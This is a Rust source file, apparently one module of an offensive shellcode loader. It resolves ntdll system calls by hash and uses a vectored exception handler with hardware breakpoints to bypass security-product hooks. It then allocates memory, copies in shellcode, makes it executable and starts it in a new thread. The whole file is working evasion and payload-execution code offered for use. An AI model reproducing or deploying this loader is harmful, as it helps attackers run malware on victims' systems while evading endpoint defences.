use crate::ntapi::types::*;
use crate::ntapi::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use crate::syscall::common::env::get_loaded_module_by_hash;
use crate::utils::veh_hwbp::{execute_with_hwbp, register_veh};
use std::ffi::c_void;

const NTDLL_HASH: u32 = crate::dbj2_hash!(b"ntdll.dll");
const NT_ALLOC_HASH: u32 = crate::dbj2_hash!(b"NtAllocateVirtualMemory");
const NT_PROTECT_HASH: u32 = crate::dbj2_hash!(b"NtProtectVirtualMemory");
const NT_CREATE_THREAD_HASH: u32 = crate::dbj2_hash!(b"NtCreateThreadEx");

pub unsafe fn exec(
    shellcode_ptr: usize,
    shellcode_len: usize,
) -> crate::utils::error::RslResult<()> {
    #[cfg(feature = "debug")]
    crate::utils::print_message("Executing via Hook Bypass...");

    let ntdll = get_loaded_module_by_hash(NTDLL_HASH).ok_or("Failed to get ntdll")?;

    let _veh_guard = register_veh()?;

    #[cfg(feature = "debug")]
    crate::utils::print_message("VEH registered.");

    let mut base_addr: *mut c_void = std::ptr::null_mut();
    let mut region_size = shellcode_len;

    execute_with_hwbp(ntdll, NT_ALLOC_HASH, &mut |addr| {
        let nt_alloc: NtAllocateVirtualMemoryFn = std::mem::transmute(addr);
        nt_alloc(
            -1,
            &mut base_addr,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    })?;

    std::ptr::copy_nonoverlapping(
        shellcode_ptr as *const u8,
        base_addr as *mut u8,
        shellcode_len,
    );

    let mut old_prot = 0;
    execute_with_hwbp(ntdll, NT_PROTECT_HASH, &mut |addr| {
        let nt_protect: NtProtectVirtualMemoryFn = std::mem::transmute(addr);
        nt_protect(
            -1,
            &mut base_addr,
            &mut region_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_prot,
        )
    })?;

    let mut thread_handle = 0;
    execute_with_hwbp(ntdll, NT_CREATE_THREAD_HASH, &mut |addr| {
        let nt_create: NtCreateThreadExFn = std::mem::transmute(addr);
        nt_create(
            &mut thread_handle,
            0x1FFFFF,
            std::ptr::null_mut(),
            -1,
            base_addr,
            std::ptr::null_mut(),
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
        )
    })?;

    #[cfg(feature = "debug")]
    crate::utils::print_message(&format!("Thread created, handle: {:#x}", thread_handle));

    drop(_veh_guard);
    crate::ntapi::wait_for_single_object(thread_handle);

    Ok(())
}
